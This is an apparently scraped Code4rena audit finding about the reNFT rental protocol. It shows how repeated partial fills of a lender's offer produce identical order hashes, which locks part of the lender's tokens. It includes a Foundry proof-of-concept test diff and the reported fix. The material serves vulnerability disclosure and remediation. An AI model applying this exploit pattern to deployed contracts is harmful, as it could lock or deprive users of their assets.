{
  "Title": "[H-07] Attacker can lock lender NFTs and ERC20 in the safe if the offer is set to partial",
  "Content": "\nIf the lender creates an offer set to partial, the attacker can lock parts of the lender's assets inside the attacker's safe.\n\n### Proof of Concept\n\nWhen reNFT zone validates the offer and create the rental, it will calculate order hash using `_deriveRentalOrderHash`, and add the rentals by calling `  STORE.addRentals ` to storage using the calculated hash.\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L592-L595>\n\n<details>\n\n```solidity\n    function _rentFromZone(\n        RentPayload memory payload,\n        SeaportPayload memory seaportPayload\n    ) internal {\n        // Check: make sure order metadata is valid with the given seaport order zone hash.\n        _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);\n\n        // Check: verify the fulfiller of the order is an owner of the recipient safe.\n        _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);\n\n        // Check: verify each execution was sent to the expected destination.\n        _executionInvariantChecks(\n            seaportPayload.totalExecutions,\n            payload.fulfillment.recipient\n        );\n\n        // Check: validate and process seaport offer and consideration items based\n        // on the order type.\n        Item[] memory items = _convertToItems(\n            seaportPayload.offer,\n            seaportPayload.consideration,\n            payload.metadata.orderType\n        );\n\n        // PAYEE orders are considered mirror-images of a PAY order. So, PAYEE orders\n        // do not need to be processed in the same way that other order types do.\n        if (\n            payload.metadata.orderType.isBaseOrder() ||\n            payload.metadata.orderType.isPayOrder()\n        ) {\n            // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and\n            // the rented amount. From this point on, new memory cannot be safely allocated until the\n            // accumulator no longer needs to include elements.\n            bytes memory rentalAssetUpdates = new bytes(0);\n\n            // Check if each item is a rental. If so, then generate the rental asset update.\n            // Memory will become safe again after this block.\n            for (uint256 i; i < items.length; ++i) {\n                if (items[i].isRental()) {\n                    // Insert the rental asset update into the dynamic array.\n                    _insert(\n                        rentalAssetUpdates,\n                        items[i].toRentalId(payload.fulfillment.recipient),\n                        items[i].amount\n                    );\n                }\n            }\n\n            // Generate the rental order.\n            RentalOrder memory order = RentalOrder({\n                seaportOrderHash: seaportPayload.orderHash,\n                items: items,\n                hooks: payload.metadata.hooks,\n                orderType: payload.metadata.orderType,\n                lender: seaportPayload.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + payload.metadata.rentDuration\n            });\n\n            // Compute the order hash.\n>>>         bytes32 orderHash = _deriveRentalOrderHash(order);\n\n            // Interaction: Update storage only if the order is a Base Order or Pay order.\n>>>         STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates));\n\n            // Interaction: Increase the deposit value on the payment escrow so\n            // it knows how many tokens were sent to it.\n            for (uint256 i = 0; i < items.length; ++i) {\n                if (items[i].isERC20()) {\n                    ESCRW.increaseDeposit(items[i].token, items[i].amount);\n                }\n            }\n\n            // Interaction: Process the hooks associated with this rental.\n            if (payload.metadata.hooks.length > 0) {\n                _addHooks(\n                    payload.metadata.hooks,\n                    seaportPayload.offer,\n                    payload.fulfillment.recipient\n                );\n            }\n\n            // Emit rental order started.\n            _emitRentalOrderStarted(order, orderHash, payload.metadata.emittedExtraData);\n        }\n    }\n```\n\n</details>\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L162-L195>\n\n<details>\n\n```solidity\n    function _deriveRentalOrderHash(\n        RentalOrder memory order\n    ) internal view returns (bytes32) {\n        // Create arrays for items and hooks.\n        bytes32[] memory itemHashes = new bytes32[](order.items.length);\n        bytes32[] memory hookHashes = new bytes32[](order.hooks.length);\n\n        // Iterate over each item.\n        for (uint256 i = 0; i < order.items.length; ++i) {\n            // Hash the item.\n            itemHashes[i] = _deriveItemHash(order.items[i]);\n        }\n\n        // Iterate over each hook.\n        for (uint256 i = 0; i < order.hooks.length; ++i) {\n            // Hash the hook.\n            hookHashes[i] = _deriveHookHash(order.hooks[i]);\n        }\n\n        return\n            keccak256(\n                abi.encode(\n                    _RENTAL_ORDER_TYPEHASH,\n                    order.seaportOrderHash,\n                    keccak256(abi.encodePacked(itemHashes)),\n                    keccak256(abi.encodePacked(hookHashes)),\n                    order.orderType,\n                    order.lender,\n                    order.renter,\n                    order.startTimestamp,\n                    order.endTimestamp\n                )\n            );\n    }\n```\n</details>\n\n\nThe problem is that if a lender's offer is created to support partial fills, the attacker can create multiple similar orders referring to the same `seaportPayload.orderHash`. Because the similar orders result in the same hash, the amount of assets that will be returned to the attacker for that hash will be only equal to the `items[i].amount` value of the order, while the remaining assets will be locked. Because the second time lender call `stopRent` it will revert caused by the rental status already removed.\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L216-L235>\n\n```solidity\n    function removeRentals(\n        bytes32 orderHash,\n        RentalAssetUpdate[] calldata rentalAssetUpdates\n    ) external onlyByProxy permissioned {\n        // The order must exist to be deleted.\n        if (!orders[orderHash]) {\n>>>         revert Errors.StorageModule_OrderDoesNotExist(orderHash);\n        } else {\n            // Delete the order from storage.\n            delete orders[orderHash];\n        }\n\n        // Process each rental asset.\n        for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {\n            RentalAssetUpdate memory asset = rentalAssetUpdates[i];\n\n            // Reduce the amount of tokens for the particular rental ID.\n            rentedAssets[asset.rentalId] -= asset.amount;\n        }\n    }\n```\n\nExample Scenario :\n\nAlice create `PAY` Offer that support partial fills consist of 2 ERC1155 and 100 ERC20 token A for the provided duration.\n\nBob fills the offer, by creating two similar partial fills, 1 ERC1155 and 50 ERC20.\n\nBecause the two offer result in the same order hash, when alice want to stop the rent, alice will only get 1 ERC1155 and 50 ERC20.\n\nCoded PoC :\n\nModify the test files to the following :\n\n<Details>\n\n```diff\ndiff --git a/test/fixtures/engine/OrderCreator.sol b/test/fixtures/engine/OrderCreator.sol\nindex 6cf6050..a4791d4 100644\n--- a/test/fixtures/engine/OrderCreator.sol\n+++ b/test/fixtures/engine/OrderCreator.sol\n@@ -64,9 +64,10 @@ contract OrderCreator is BaseProtocol {\n \n         // Define a standard OrderComponents struct which is ready for\n         // use with the Create Policy and the protocol conduit contract\n+        // PARTIAL_RESTRICTED from FULL_RESTRICTED\n         OrderComponentsLib\n             .empty()\n-            .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n+            .withOrderType(SeaportOrderType.PARTIAL_RESTRICTED)\n             .withZone(address(create))\n             .withStartTime(block.timestamp)\n             .withEndTime(block.timestamp + 100)\ndiff --git a/test/fixtures/engine/OrderFulfiller.sol b/test/fixtures/engine/OrderFulfiller.sol\nindex d61448a..5f12d23 100644\n--- a/test/fixtures/engine/OrderFulfiller.sol\n+++ b/test/fixtures/engine/OrderFulfiller.sol\n@@ -113,6 +113,54 @@ contract OrderFulfiller is OrderCreator {\n         );\n     }\n \n+    function createOrderFulfillmentPartial(\n+        ProtocolAccount memory _fulfiller,\n+        Order memory order,\n+        bytes32 orderHash,\n+        OrderMetadata memory metadata\n+    ) internal {\n+        // set the fulfiller account\n+        fulfiller = _fulfiller;\n+\n+        // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n+        // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n+        seaportRecipient = address(_fulfiller.safe);\n+\n+        // get a pointer to a new order to fulfill\n+        OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n+\n+        // create an order fulfillment\n+        OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n+\n+        // add the order hash and fulfiller\n+        orderToFulfill.orderHash = orderHash;\n+\n+        // create rental zone payload data\n+        _createRentalPayload(\n+            orderToFulfill.payload,\n+            RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n+        );\n+\n+        // generate the signature for the payload\n+        bytes memory signature = _signProtocolOrder(\n+            rentalSigner.privateKey,\n+            create.getRentPayloadHash(orderToFulfill.payload)\n+        );\n+\n+        // create an advanced order from the order. Pass the rental\n+        // payload as extra data\n+        _createAdvancedOrder(\n+            orderToFulfill.advancedOrder,\n+            AdvancedOrder(\n+                order.parameters,\n+                1,\n+                2,\n+                order.signature,\n+                abi.encode(orderToFulfill.payload, signature)\n+            )\n+        );\n+    }\n+\n     function _createOrderFulfiller(\n         ProtocolAccount storage storageFulfiller,\n         ProtocolAccount memory _fulfiller\n@@ -323,6 +371,96 @@ contract OrderFulfiller is OrderCreator {\n         }\n     }\n \n+    function _createRentalOrderPartial(\n+        OrderToFulfill memory orderToFulfill\n+    ) internal view returns (RentalOrder memory rentalOrder) {\n+        // get the order parameters\n+        OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n+\n+        // get the payload\n+        RentPayload memory payload = orderToFulfill.payload;\n+\n+        // get the metadata\n+        OrderMetadata memory metadata = payload.metadata;\n+\n+        // construct a rental order\n+        rentalOrder = RentalOrder({\n+            seaportOrderHash: orderToFulfill.orderHash,\n+            items: new Item[](parameters.offer.length + parameters.consideration.length),\n+            hooks: metadata.hooks,\n+            orderType: metadata.orderType,\n+            lender: parameters.offerer,\n+            renter: payload.intendedFulfiller,\n+            rentalWallet: payload.fulfillment.recipient,\n+            startTimestamp: block.timestamp,\n+            endTimestamp: block.timestamp + metadata.rentDuration\n+        });\n+\n+        // for each new offer item being rented, create a new item struct to add to the rental order\n+        for (uint256 i = 0; i < parameters.offer.length; i++) {\n+            // PAYEE orders cannot have offer items\n+            require(\n+                metadata.orderType != OrderType.PAYEE,\n+                \"TEST: cannot have offer items in PAYEE order\"\n+            );\n+\n+            // get the offer item\n+            OfferItem memory offerItem = parameters.offer[i];\n+\n+            // determine the item type\n+            ItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n+\n+            // determine which entity the payment will settle to\n+            SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n+                ? SettleTo.RENTER\n+                : SettleTo.LENDER;\n+\n+            // create a new rental item\n+            rentalOrder.items[i] = Item({\n+                itemType: itemType,\n+                settleTo: settleTo,\n+                token: offerItem.token,\n+                amount: offerItem.startAmount / 2,\n+                identifier: offerItem.identifierOrCriteria\n+            });\n+        }\n+\n+        // for each consideration item in return, create a new item struct to add to the rental order\n+        for (uint256 i = 0; i < parameters.consideration.length; i++) {\n+            // PAY orders cannot have consideration items\n+            require(\n+                metadata.orderType != OrderType.PAY,\n+                \"TEST: cannot have consideration items in PAY order\"\n+            );\n+\n+            // get the offer item\n+            ConsiderationItem memory considerationItem = parameters.consideration[i];\n+\n+            // determine the item type\n+            ItemType itemType = _seaportItemTypeToRentalItemType(\n+                considerationItem.itemType\n+            );\n+\n+            // determine which entity the payment will settle to\n+            SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n+                considerationItem.itemType == SeaportItemType.ERC20\n+                ? SettleTo.RENTER\n+                : SettleTo.LENDER;\n+\n+            // calculate item index offset\n+            uint256 itemIndex = i + parameters.offer.length;\n+\n+            // create a new payment item\n+            rentalOrder.items[itemIndex] = Item({\n+                itemType: itemType,\n+                settleTo: settleTo,\n+                token: considerationItem.token,\n+                amount: considerationItem.startAmount,\n+                identifier: considerationItem.identifierOrCriteria\n+            });\n+        }\n+    }\n+\n     function _signProtocolOrder(\n         uint256 signerPrivateKey,\n         bytes32 payloadHash\n@@ -526,20 +664,73 @@ contract OrderFulfiller is OrderCreator {\n         }\n         // otherwise, expect the relevant event to be emitted.\n         else {\n-            vm.expectEmit({emitter: address(create)});\n-            emit Events.RentalOrderStarted(\n-                create.getRentalOrderHash(payRentalOrder),\n-                payOrder.payload.metadata.emittedExtraData,\n-                payRentalOrder.seaportOrderHash,\n-                payRentalOrder.items,\n-                payRentalOrder.hooks,\n-                payRentalOrder.orderType,\n-                payRentalOrder.lender,\n-                payRentalOrder.renter,\n-                payRentalOrder.rentalWallet,\n-                payRentalOrder.startTimestamp,\n-                payRentalOrder.endTimestamp\n-            );\n+            // vm.expectEmit({emitter: address(create)});\n+            // emit Events.RentalOrderStarted(\n+            //     create.getRentalOrderHash(payRentalOrder),\n+            //     payOrder.payload.metadata.emittedExtraData,\n+            //     payRentalOrder.seaportOrderHash,\n+            //     payRentalOrder.items,\n+            //     payRentalOrder.hooks,\n+            //     payRentalOrder.orderType,\n+            //     payRentalOrder.lender,\n+            //     payRentalOrder.renter,\n+            //     payRentalOrder.rentalWallet,\n+            //     payRentalOrder.startTimestamp,\n+            //     payRentalOrder.endTimestamp\n+            // );\n+        }\n+\n+        // the offerer of the PAYEE order fulfills the orders.\n+        vm.prank(fulfiller.addr);\n+\n+        // fulfill the orders\n+        seaport.matchAdvancedOrders(\n+            _deconstructOrdersToFulfill(),\n+            new CriteriaResolver[](0),\n+            seaportMatchOrderFulfillments,\n+            seaportRecipient\n+        );\n+\n+        // clear structs\n+        resetFulfiller();\n+        resetOrdersToFulfill();\n+        resetSeaportMatchOrderFulfillments();\n+    }\n+\n+    function _finalizePayOrderFulfillmentPartial(\n+        bytes memory expectedError\n+    )\n+        private\n+        returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n+    {\n+        // get the orders to fulfill\n+        OrderToFulfill memory payOrder = ordersToFulfill[0];\n+        OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n+\n+        // create rental orders\n+        payRentalOrder = _createRentalOrderPartial(payOrder);\n+        payeeRentalOrder = _createRentalOrder(payeeOrder);\n+\n+        // expect an error if error data was provided\n+        if (expectedError.length != 0) {\n+            vm.expectRevert(expectedError);\n+        }\n+        // otherwise, expect the relevant event to be emitted.\n+        else {\n+            // vm.expectEmit({emitter: address(create)});\n+            // emit Events.RentalOrderStarted(\n+            //     create.getRentalOrderHash(payRentalOrder),\n+            //     payOrder.payload.metadata.emittedExtraData,\n+            //     payRentalOrder.seaportOrderHash,\n+            //     payRentalOrder.items,\n+            //     payRentalOrder.hooks,\n+            //     payRentalOrder.orderType,\n+            //     payRentalOrder.lender,\n+            //     payRentalOrder.renter,\n+            //     payRentalOrder.rentalWallet,\n+            //     payRentalOrder.startTimestamp,\n+            //     payRentalOrder.endTimestamp\n+            // );\n         }\n \n         // the offerer of the PAYEE order fulfills the orders.\n@@ -566,6 +757,13 @@ contract OrderFulfiller is OrderCreator {\n         (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n     }\n \n+    function finalizePayOrderFulfillmentPartial()\n+    internal\n+    returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n+{\n+    (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillmentPartial(bytes(\"\"));\n+}\n+\n     function finalizePayOrderFulfillmentWithError(\n         bytes memory expectedError\n     )\ndiff --git a/test/integration/Rent.t.sol b/test/integration/Rent.t.sol\nindex 6c4c8d3..f20b299 100644\n--- a/test/integration/Rent.t.sol\n+++ b/test/integration/Rent.t.sol\n@@ -13,6 +13,7 @@ import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStruct\n \n import {BaseTest} from \"@test/BaseTest.sol\";\n import {ProtocolAccount} from \"@test/utils/Types.sol\";\n+import \"@forge-std/console.sol\";\n \n contract TestRent is BaseTest {\n     function test_Success_Rent_BaseOrder_ERC721() public {\n@@ -276,6 +277,135 @@ contract TestRent is BaseTest {\n         assertEq(erc721s[0].ownerOf(0), address(bob.safe));\n     }\n \n+    function test_Success_Rent_PayOrder_Partial() public {\n+        // create a PAY order\n+        createOrder({\n+            offerer: alice,\n+            orderType: OrderType.PAY,\n+            erc721Offers: 0,\n+            erc1155Offers: 2,\n+            erc20Offers: 1,\n+            erc721Considerations: 0,\n+            erc1155Considerations: 0,\n+            erc20Considerations: 0\n+        });\n+\n+        // finalize the pay order creation\n+        (\n+            Order memory payOrder,\n+            bytes32 payOrderHash,\n+            OrderMetadata memory payOrderMetadata\n+        ) = finalizeOrder();\n+\n+        // create a PAYEE order. The fulfiller will be the offerer.\n+        createOrder({\n+            offerer: bob,\n+            orderType: OrderType.PAYEE,\n+            erc721Offers: 0,\n+            erc1155Offers: 0,\n+            erc20Offers: 0,\n+            erc721Considerations: 0,\n+            erc1155Considerations: 2,\n+            erc20Considerations: 1\n+        });\n+\n+        // finalize the pay order creation\n+        (\n+            Order memory payeeOrder,\n+            bytes32 payeeOrderHash,\n+            OrderMetadata memory payeeOrderMetadata\n+        ) = finalizeOrder();\n+\n+        // create an order fulfillment for the pay order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payOrder,\n+            orderHash: payOrderHash,\n+            metadata: payOrderMetadata\n+        });\n+\n+        // create an order fulfillment for the payee order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payeeOrder,\n+            orderHash: payeeOrderHash,\n+            metadata: payeeOrderMetadata\n+        });\n+\n+        // add an amendment to include the seaport fulfillment structs\n+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n+\n+        // finalize the order pay/payee order fulfillment\n+        (\n+            RentalOrder memory payRentalOrder,\n+            RentalOrder memory payeeRentalOrder\n+        ) = finalizePayOrderFulfillment();\n+\n+\n+        // get the rental order hashes\n+        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);\n+        bytes32 payeeRentalOrderHash = create.getRentalOrderHash(payeeRentalOrder);\n+        console.log(\"first pay rental order : \");\n+        console.logBytes32(payRentalOrderHash);\n+        console.log(\"first payee rental order : \");\n+        console.logBytes32(payeeRentalOrderHash);\n+        // second time - my addition\n+        // create an order fulfillment for the pay order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payOrder,\n+            orderHash: payOrderHash,\n+            metadata: payOrderMetadata\n+        });\n+\n+        // create an order fulfillment for the payee order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payeeOrder,\n+            orderHash: payeeOrderHash,\n+            metadata: payeeOrderMetadata\n+        });\n+\n+        // add an amendment to include the seaport fulfillment structs\n+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n+\n+        // finalize the order pay/payee order fulfillment\n+        (\n+            payRentalOrder,\n+            payeeRentalOrder\n+        ) = finalizePayOrderFulfillment();\n+\n+        // get the rental order hashes\n+        payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);\n+        payeeRentalOrderHash = create.getRentalOrderHash(payeeRentalOrder);\n+        console.log(\"second pay rental order : \");\n+        console.logBytes32(payRentalOrderHash);\n+        console.log(\"second payee rental order : \");\n+        console.logBytes32(payeeRentalOrderHash);\n+        // second time - end\n+\n+        // assert that the rental order was stored\n+        assertEq(STORE.orders(payRentalOrderHash), true);\n+\n+        // assert that the payee rental order was not put in storage\n+        assertEq(STORE.orders(payeeRentalOrderHash), false);\n+\n+        // assert that the token is in storage\n+        // assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);\n+\n+        // assert that the offerer made a payment\n+        assertEq(erc20s[0].balanceOf(alice.addr), uint256(9900));\n+\n+        // assert that a payment was made to the escrow contract\n+        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n+\n+        // assert that a payment was synced properly in the escrow contract\n+        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n+\n+        // assert that the ERC721 is in the rental wallet of the fulfiller\n+        // assertEq(erc721s[0].ownerOf(0), address(bob.safe));\n+    }\n+\n     // This test involves a PAY order where one of the items is left out of the PAYEE order.\n     // Instead, the fulfiller attempts to use the `recipient` input parameter on `matchAdvancedOrders`\n     // to try to send an asset to an unauthorized address\ndiff --git a/test/integration/StopRent.t.sol b/test/integration/StopRent.t.sol\nindex 3d19d3c..0cf67c2 100644\n--- a/test/integration/StopRent.t.sol\n+++ b/test/integration/StopRent.t.sol\n@@ -7,6 +7,8 @@ import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStruct\n \n import {BaseTest} from \"@test/BaseTest.sol\";\n \n+import \"@forge-std/console.sol\";\n+\n contract TestStopRent is BaseTest {\n     function test_StopRent_BaseOrder() public {\n         // create a BASE order\n@@ -245,6 +247,134 @@ contract TestStopRent is BaseTest {\n         assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));\n     }\n \n+    function test_stopRent_payOrder_inFull_stoppedByRenter_Partial() public {\n+        // create a PAY order\n+        createOrder({\n+            offerer: alice,\n+            orderType: OrderType.PAY,\n+            erc721Offers: 0,\n+            erc1155Offers: 2,\n+            erc20Offers: 1,\n+            erc721Considerations: 0,\n+            erc1155Considerations: 0,\n+            erc20Considerations: 0\n+        });\n+\n+        // finalize the pay order creation\n+        (\n+            Order memory payOrder,\n+            bytes32 payOrderHash,\n+            OrderMetadata memory payOrderMetadata\n+        ) = finalizeOrder();\n+\n+        // create a PAYEE order. The fulfiller will be the offerer.\n+        createOrder({\n+            offerer: bob,\n+            orderType: OrderType.PAYEE,\n+            erc721Offers: 0,\n+            erc1155Offers: 0,\n+            erc20Offers: 0,\n+            erc721Considerations: 0,\n+            erc1155Considerations: 2,\n+            erc20Considerations: 1\n+        });\n+\n+        // finalize the pay order creation\n+        (\n+            Order memory payeeOrder,\n+            bytes32 payeeOrderHash,\n+            OrderMetadata memory payeeOrderMetadata\n+        ) = finalizeOrder();\n+\n+        // create an order fulfillment for the pay order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payOrder,\n+            orderHash: payOrderHash,\n+            metadata: payOrderMetadata\n+        });\n+\n+        // create an order fulfillment for the payee order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payeeOrder,\n+            orderHash: payeeOrderHash,\n+            metadata: payeeOrderMetadata\n+        });\n+\n+        // add an amendment to include the seaport fulfillment structs\n+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n+\n+        // finalize the order pay/payee order fulfillment\n+        (RentalOrder memory payRentalOrderFirst, ) = finalizePayOrderFulfillmentPartial();\n+\n+        // get the rental order hashes\n+        bytes32 payRentalOrderHashFirst = create.getRentalOrderHash(payRentalOrderFirst);\n+        console.log(\"first pay rental order : \");\n+        console.logBytes32(payRentalOrderHashFirst);\n+        console.log(STORE.orders(payRentalOrderHashFirst));\n+        // second time - my addition\n+        // create an order fulfillment for the pay order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payOrder,\n+            orderHash: payOrderHash,\n+            metadata: payOrderMetadata\n+        });\n+\n+        // create an order fulfillment for the payee order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payeeOrder,\n+            orderHash: payeeOrderHash,\n+            metadata: payeeOrderMetadata\n+        });\n+\n+        // add an amendment to include the seaport fulfillment structs\n+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n+\n+        // finalize the order pay/payee order fulfillment\n+        (\n+            RentalOrder memory payRentalOrderFirstSecond,\n+        ) = finalizePayOrderFulfillmentPartial();\n+\n+        // get the rental order hashes\n+        console.log(\"second pay rental order : \");\n+        bytes32 payRentalOrderHashSecond = create.getRentalOrderHash(payRentalOrderFirstSecond);\n+        console.logBytes32(payRentalOrderHashSecond);\n+        console.log(STORE.orders(payRentalOrderHashSecond));\n+        // second time - end\n+\n+        // speed up in time past the rental expiration\n+        vm.warp(block.timestamp + 750);\n+\n+        // stop the rental order\n+        vm.prank(bob.addr);\n+        stop.stopRent(payRentalOrderFirst);\n+        vm.expectRevert();\n+        stop.stopRent(payRentalOrderFirstSecond);\n+\n+        // assert that the rental order doesnt exist in storage\n+        assertEq(STORE.orders(payRentalOrderHashFirst), false);\n+\n+        // assert that the token is still mark as rented due to amount still exist in storage\n+        assertEq(STORE.isRentedOut(address(bob.safe), address(erc1155s[0]), 0), true);\n+        assertEq(STORE.isRentedOut(address(bob.safe), address(erc1155s[1]), 0), true);\n+\n+        // assert that the ERC1155 is back to alice only half of them\n+        assertEq(erc1155s[0].balanceOf(address(alice.addr), 0), uint256(50));\n+        assertEq(erc1155s[1].balanceOf(address(alice.addr), 0), uint256(50));\n+\n+        // assert that the offerer made a payment\n+        assertEq(erc20s[0].balanceOf(alice.addr), uint256(9900));\n+\n+        // assert that the fulfiller received the payment\n+        assertEq(erc20s[0].balanceOf(bob.addr), uint256(10050));\n+\n+        // assert that a payment was pulled from the escrow contract\n+        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(50));\n+    }\n+\n     function test_stopRent_payOrder_proRata_stoppedByLender() public {\n         // create a PAY order\n         createOrder({\n\n```\n\n</details>\n\nRun the test :\n\n```shell\nforge test -vv --match-contract TestStopRent --match-test test_stopRent_payOrder_inFull_stoppedByRenter_Partial\n```\n\nFrom the test, it can be observed that half of the lender's assets are locked, and the order cannot be stopped even after the rent duration has passed.\n\n### Recommended Mitigation Steps\n\nIntroduce nonce when calculating orderHash, to ensure every order will always unique.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/203#issuecomment-1908713503)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/10) - Prevents `RentPayload` replayability and ensures that orders must be unique by disallowing partial orders from seaport.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/8), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/47) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/36).\n\n***\n \n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-01-renft",
  "Code": [
    {
      "filename": "src/policies/Create.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {ZoneParameters} from \"@seaport-core/lib/rental/ConsiderationStructs.sol\";\nimport {ReceivedItem, SpentItem} from \"@seaport-types/lib/ConsiderationStructs.sol\";\nimport {LibString} from \"@solady/utils/LibString.sol\";\n\nimport {ISafe} from \"@src/interfaces/ISafe.sol\";\nimport {IHook} from \"@src/interfaces/IHook.sol\";\nimport {ZoneInterface} from \"@src/interfaces/IZone.sol\";\n\nimport {Kernel, Policy, Permissions, Keycode} from \"@src/Kernel.sol\";\nimport {toKeycode, toRole} from \"@src/libraries/KernelUtils.sol\";\nimport {RentalUtils} from \"@src/libraries/RentalUtils.sol\";\nimport {Signer} from \"@src/packages/Signer.sol\";\nimport {Zone} from \"@src/packages/Zone.sol\";\nimport {Accumulator} from \"@src/packages/Accumulator.sol\";\nimport {Storage} from \"@src/modules/Storage.sol\";\nimport {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\nimport {\n    RentalOrder,\n    RentPayload,\n    SeaportPayload,\n    Hook,\n    OrderFulfillment,\n    OrderMetadata,\n    OrderType,\n    Item,\n    ItemType,\n    SettleTo,\n    RentalId,\n    RentalAssetUpdate\n} from \"@src/libraries/RentalStructs.sol\";\nimport {Errors} from \"@src/libraries/Errors.sol\";\nimport {Events} from \"@src/libraries/Events.sol\";\n\n/**\n * @title Create\n * @notice Acts as an interface for all behavior related to creating a rental.\n */\ncontract Create is Policy, Signer, Zone, Accumulator {\n    using RentalUtils for Item;\n    using RentalUtils for Item[];\n    using RentalUtils for SpentItem;\n    using RentalUtils for ReceivedItem;\n    using RentalUtils for OrderType;\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                         Kernel Policy Configuration                         //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    // Modules that the policy depends on.\n    Storage public STORE;\n    PaymentEscrow public ESCRW;\n\n    /**\n     * @dev Instantiate this contract as a policy.\n     *\n     * @param kernel_ Address of the kernel contract.\n     */\n    constructor(Kernel kernel_) Policy(kernel_) Signer() Zone() {}\n\n    /**\n     * @notice Upon policy activation, configures the modules that the policy depends on.\n     *         If a module is ever upgraded that this policy depends on, the kernel will\n     *         call this function again to ensure this policy has the current address\n     *         of the module.\n     *\n     * @return dependencies Array of keycodes which represent modules that\n     *                      this policy depends on.\n     */\n    function configureDependencies()\n        external\n        override\n        onlyKernel\n        returns (Keycode[] memory dependencies)\n    {\n        dependencies = new Keycode[](2);\n\n        dependencies[0] = toKeycode(\"STORE\");\n        STORE = Storage(getModuleAddress(toKeycode(\"STORE\")));\n\n        dependencies[1] = toKeycode(\"ESCRW\");\n        ESCRW = PaymentEscrow(getModuleAddress(toKeycode(\"ESCRW\")));\n    }\n\n    /**\n     * @notice Upon policy activation, permissions are requested from the kernel to access\n     *         particular keycode <> function selector pairs. Once these permissions are\n     *         granted, they do not change and can only be revoked when the policy is\n     *         deactivated by the kernel.\n     *\n     * @return requests Array of keycode <> function selector pairs which represent\n     *                  permissions for the policy.\n     */\n    function requestPermissions()\n        external\n        view\n        override\n        onlyKernel\n        returns (Permissions[] memory requests)\n    {\n        requests = new Permissions[](2);\n        requests[0] = Permissions(toKeycode(\"STORE\"), STORE.addRentals.selector);\n        requests[1] = Permissions(toKeycode(\"ESCRW\"), ESCRW.increaseDeposit.selector);\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                              View Functions                                 //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @notice Retrieves the domain separator.\n     *\n     * @return The domain separator for the protocol.\n     */\n    function domainSeparator() external view returns (bytes32) {\n        return _DOMAIN_SEPARATOR;\n    }\n\n    /**\n     * @notice Derives the rental order EIP-712 compliant hash from a `RentalOrder`.\n     *\n     * @param order Rental order converted to a hash.\n     */\n    function getRentalOrderHash(\n        RentalOrder memory order\n    ) external view returns (bytes32) {\n        return _deriveRentalOrderHash(order);\n    }\n\n    /**\n     * @notice Derives the rent payload EIP-712 compliant hash from a 